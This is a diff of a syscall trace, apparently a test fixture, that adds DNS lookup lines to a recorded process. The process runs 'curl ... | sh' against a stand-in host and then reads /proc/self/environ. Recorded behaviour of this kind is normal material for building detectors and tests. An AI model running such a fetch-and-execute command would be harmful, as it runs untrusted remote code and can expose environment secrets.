@@ -8,4 +8,7 @@
 1719245678.001250 execve("/bin/sh", ["sh", "-c", "curl -fsSL https://fixture.invalid/i.sh | sh"], 0x7ffd00000000 /* 12 vars */) = 0
 1719245678.001350 execve("/usr/bin/curl", ["curl", "-fsSL", "https://fixture.invalid/i.sh"], 0x7ffd00000000 /* 12 vars */) = 0
 1719245678.001450 openat(AT_FDCWD, "/proc/self/environ", O_RDONLY) = 12</proc/4101/environ>
+1719245678.001460 socket(AF_INET, SOCK_DGRAM|SOCK_CLOEXEC|SOCK_NONBLOCK, IPPROTO_IP) = 30<UDP:[52001]>
+1719245678.001470 connect(30<UDP:[52001]>, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.53")}, 16) = 0
+1719245678.001480 send(30<UDP:[10.1.0.4:52001->127.0.0.53:53]>, "\022\007\001\000\000\001\000\000\000\000\000\000\011resolvers\007example\003net\000\000\001\000\001", 41, MSG_NOSIGNAL) = 41
 1719245678.001500 +++ exited with 0 +++
